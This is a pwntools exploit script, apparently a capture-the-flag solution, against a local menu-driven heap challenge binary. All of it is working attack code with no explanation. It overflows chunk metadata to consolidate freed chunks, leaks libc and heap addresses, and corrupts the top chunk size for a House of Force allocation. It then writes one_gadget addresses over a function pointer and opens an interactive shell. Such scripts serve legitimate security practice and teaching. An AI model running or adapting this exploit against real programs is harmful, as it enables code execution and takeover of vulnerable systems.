from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'Your choice:'
def add(size, content):
	sla(menu, b'2')
	sla(b'item name:', byte(size))
	sda(b'name of item:', content)	

def dele(idx):
	sla(menu, b'4')
	sla(b'index of item:', byte(idx))

def show():
	sla(menu, b'1')

def edit(idx, size, content):
	sla(menu, b'3')
	sla(b'index of item:', byte(idx))
	sla(b'item name:', byte(size))
	sda(b'name of the item:', content)

add(0x10, b'A\n') # 0
add(0x80, b'A\n') # 1
add(0x10, b'A\n') # 2
add(0x80, b'A\n') # 3
add(0x10, b'A\n') # 4

dele(1)
payload = b'A'*0x10 + p64(0xB0) + p64(0x90)
edit(2, len(payload), payload)
dele(3)
add(0x80, b'A\n')
show()
rut(b'2 : ')
libc_base = addr(b'4 : ') - 88 - 0x10 - libc.symbols['__malloc_hook']
add(0x10, b'A\n')
dele(0)
dele(2)
show()
rut(b'3 : ')
heap_base = addr(b'4 : ') - 0x20
dest = heap_base + 0x10
old_top = heap_base + 0x1A0
offset = dest - old_top - 0x20
print("libc_base: ", hex(libc_base))
print("heap_base: ", hex(heap_base))
print("dest     : ", hex(dest))
print("old_top  : ", hex(old_top))
print("offset   : ", hex(offset))
payload = b'A'*0x10 + p64(0) + p64(0xFFFFFFFFFFFFFFFF)
edit(4, len(payload), payload)

one_gadget1 = libc_base + 0x45226
one_gadget2 = libc_base + 0x4527a
one_gadget3 = libc_base + 0xf03a4
one_gadget4 = libc_base + 0xf1247
#debug()
add(offset, b'A\n')
#debug()
add(0x100, p64(one_gadget4)*4)
#debug()
sla(menu, b'5')
sh()
